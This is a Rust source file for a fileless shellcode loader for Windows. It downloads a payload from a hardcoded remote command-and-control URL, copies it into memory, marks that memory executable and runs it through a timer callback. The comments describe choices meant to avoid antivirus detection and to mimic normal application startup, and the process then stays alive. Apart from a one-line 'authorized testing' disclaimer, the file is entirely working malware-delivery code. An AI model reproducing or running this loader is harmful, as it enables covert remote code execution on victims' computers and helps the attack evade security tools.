// src/main.rs
// Rust-based fileless shellcode loader - Native GUI application
// Compiled as /SUBSYSTEM:WINDOWS - no console window at all
// No window hiding APIs used - avoids AV detection
// For authorized security testing only

#![windows_subsystem = "windows"]

use std::ptr;
use std::mem::transmute;
use std::ffi::c_void;
use std::time::Duration;

use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winuser::{
    SetTimer, KillTimer, GetMessageA, TranslateMessage, DispatchMessageA
};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};

// ==================== Configuration ====================
const REMOTE_URL: &str = "https://app.zhuyan.cloud/v5/dl/cmd/c2.bin";
const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

// ==================== Function Pointer Types ====================
type VirtualAllocFn = unsafe extern "system" fn(
    lpAddress: *mut c_void,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> *mut c_void;

type VirtualProtectFn = unsafe extern "system" fn(
    lpAddress: *mut c_void,
    dwSize: usize,
    flNewProtect: u32,
    lpflOldProtect: *mut u32,
) -> i32;

type SetTimerFn = unsafe extern "system" fn(
    hWnd: *mut c_void,
    nIDEvent: usize,
    uElapse: u32,
    lpTimerFunc: Option<unsafe extern "system" fn(*mut c_void, u32, usize, u32)>,
) -> usize;

type GetMessageFn = unsafe extern "system" fn(
    lpMsg: *mut c_void,
    hWnd: *mut c_void,
    wMsgFilterMin: u32,
    wMsgFilterMax: u32,
) -> i32;

type TranslateMessageFn = unsafe extern "system" fn(
    lpMsg: *const c_void,
) -> i32;

type DispatchMessageFn = unsafe extern "system" fn(
    lpMsg: *const c_void,
) -> isize;

type KillTimerFn = unsafe extern "system" fn(
    hWnd: *mut c_void,
    uIDEvent: usize,
) -> i32;

// ==================== Download Function ====================
fn download_payload(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::builder()
        .user_agent(USER_AGENT)
        .timeout(Duration::from_secs(30))
        .build()?;
    
    let response = client.get(url).send()?;
    let bytes = response.bytes()?;
    Ok(bytes.to_vec())
}

// ==================== Memory Execution ====================
fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8);
        if kernel32.is_null() {
            return Err("Failed to get kernel32 handle".into());
        }
        
        let virtual_alloc: VirtualAllocFn = transmute(
            GetProcAddress(kernel32, b"VirtualAlloc\0".as_ptr() as *const i8)
        );
        
        let virtual_protect: VirtualProtectFn = transmute(
            GetProcAddress(kernel32, b"VirtualProtect\0".as_ptr() as *const i8)
        );
        
        let user32 = GetModuleHandleA(b"user32.dll\0".as_ptr() as *const i8);
        if user32.is_null() {
            return Err("Failed to get user32 handle".into());
        }
        
        let set_timer: SetTimerFn = transmute(
            GetProcAddress(user32, b"SetTimer\0".as_ptr() as *const i8)
        );
        
        let get_message: GetMessageFn = transmute(
            GetProcAddress(user32, b"GetMessageA\0".as_ptr() as *const i8)
        );
        
        let translate_message: TranslateMessageFn = transmute(
            GetProcAddress(user32, b"TranslateMessage\0".as_ptr() as *const i8)
        );
        
        let dispatch_message: DispatchMessageFn = transmute(
            GetProcAddress(user32, b"DispatchMessageA\0".as_ptr() as *const i8)
        );
        
        let kill_timer: KillTimerFn = transmute(
            GetProcAddress(user32, b"KillTimer\0".as_ptr() as *const i8)
        );
        
        if virtual_alloc as usize == 0 || virtual_protect as usize == 0 ||
           set_timer as usize == 0 || get_message as usize == 0 ||
           translate_message as usize == 0 || dispatch_message as usize == 0 {
            return Err("Failed to resolve required APIs".into());
        }

        let exec_mem = virtual_alloc(
            ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if exec_mem.is_null() {
            return Err("VirtualAlloc failed".into());
        }

        ptr::copy(
            shellcode.as_ptr() as *const c_void,
            exec_mem,
            shellcode.len(),
        );

        let mut old_protect: u32 = 0;
        let result = virtual_protect(
            exec_mem,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );
        if result == 0 {
            return Err("VirtualProtect failed".into());
        }

        let timer_callback: unsafe extern "system" fn(*mut c_void, u32, usize, u32) = transmute(exec_mem);
        let timer_id = set_timer(ptr::null_mut(), 0, 0, Some(timer_callback));
        if timer_id == 0 {
            return Err("SetTimer failed".into());
        }

        let mut msg: c_void = std::mem::zeroed();
        while get_message(&mut msg as *mut c_void, ptr::null_mut(), 0, 0) > 0 {
            translate_message(&msg as *const c_void);
            dispatch_message(&msg as *const c_void);
        }

        kill_timer(ptr::null_mut(), timer_id);
    }

    Ok(())
}

// ==================== Entry Point ====================
fn main() {
    // ================================================================
    // NOTE: No window hiding code at all!
    // This is a native GUI application (/SUBSYSTEM:WINDOWS)
    // No console window is ever created, so no hiding is needed.
    // ================================================================

    // Small delay to mimic normal application startup
    std::thread::sleep(Duration::from_millis(50));

    // Download and execute
    if let Ok(shellcode) = download_payload(REMOTE_URL) {
        if !shellcode.is_empty() {
            let _ = execute_shellcode(&shellcode);
        }
    }

    // Keep process alive
    loop {
        std::thread::sleep(Duration::from_secs(60));
    }
}